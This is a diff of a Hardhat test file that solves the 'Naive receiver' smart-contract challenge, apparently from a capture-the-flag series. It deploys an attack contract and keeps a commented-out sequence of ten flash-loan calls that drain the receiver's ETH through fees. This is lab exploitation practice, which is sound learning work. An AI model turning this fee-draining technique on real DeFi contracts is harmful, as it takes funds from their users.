@@ -1,9 +1,10 @@
-const { ethers } = require('hardhat');
+const { ethers } = require('hardhat'); 
 const { expect } = require('chai');
 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, player;
     let pool, receiver;
+    let attack;
 
     // Pool has 1000 ETH in balance
     const ETHER_IN_POOL = 1000n * 10n ** 18n;
@@ -37,11 +38,28 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /* The second solution with 1 transaction */
+        const AttackFactory = await ethers.getContractFactory('Attack', player);
+        attack = await AttackFactory.connect(player).deploy(receiver.address,pool.address);
+
+        /* The first solution
+        const ETH = await pool.ETH();
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        await pool.flashLoan(receiver.address,ETH,1,"0x");
+        */
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
 
         // All ETH has been drained from the receiver
         expect(
